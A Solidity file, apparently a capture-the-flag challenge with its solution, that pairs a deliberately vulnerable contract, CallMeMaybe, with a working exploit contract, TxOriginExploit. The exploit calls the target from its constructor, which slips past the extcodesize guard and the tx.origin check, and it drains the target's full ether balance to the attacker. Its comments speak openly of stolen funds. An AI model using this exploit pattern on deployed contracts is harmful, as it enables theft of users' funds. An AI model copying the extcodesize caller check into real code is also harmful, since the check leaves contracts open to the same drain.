// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

contract CallMeMaybe {
    modifier callMeMaybe() {
        uint32 size;
        address _addr = msg.sender;
        assembly {
            size := extcodesize(_addr)
        }
        if (size > 0) {
            revert();
        }
        _;
    }

    function hereIsMyNumber() public callMeMaybe {
        if (tx.origin == msg.sender) {
            revert();
        } else {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    receive() external payable {}
}

contract TxOriginExploit {
    CallMeMaybe target;

    constructor(address payable _target) payable {
        target = CallMeMaybe(_target);

        // Exploit the vulnerability during the constructor execution
        target.hereIsMyNumber();
        
        // Transfer stolen funds to the attacker (EOA)
        payable(msg.sender).transfer(address(this).balance);
    }

    // Allow the contract to receive Ether
    receive() external payable {}
}

